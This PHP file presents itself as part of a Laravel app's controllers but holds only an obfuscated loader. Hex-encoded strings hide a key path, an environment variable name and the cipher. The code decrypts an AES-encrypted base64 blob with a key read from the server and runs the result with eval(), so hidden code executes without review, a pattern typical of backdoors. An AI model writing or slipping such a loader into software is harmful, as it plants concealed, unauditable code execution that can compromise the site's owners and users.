<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('PdW4iocNiDgI3l9kJ4LRAA==');

$c=base64_decode(

'OfNapiDtOeCNeldP2jOVx81CZmBZH5lgAlyAjXeKqqCFKYJ7d9pfA2T3LNBqCryMuyiA/V7Eej7+' .
'pRoiJ75lY2oU6qKeJdWqRLJJNel1rC9KiskYWTKywtVhq4L1pV/WiLteRUHj955hD3eaFenEghe4' .
'ZzL0W/Q4lPYzoG+MzTwYcWD4Wc+tk/9q1Xv41kQxBrD4PshhlDSY1RbYHaabXDUxTCASZdl9ylOd' .
'kAHHUVRIZsbXOYqTR+kdHM+CknCt'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

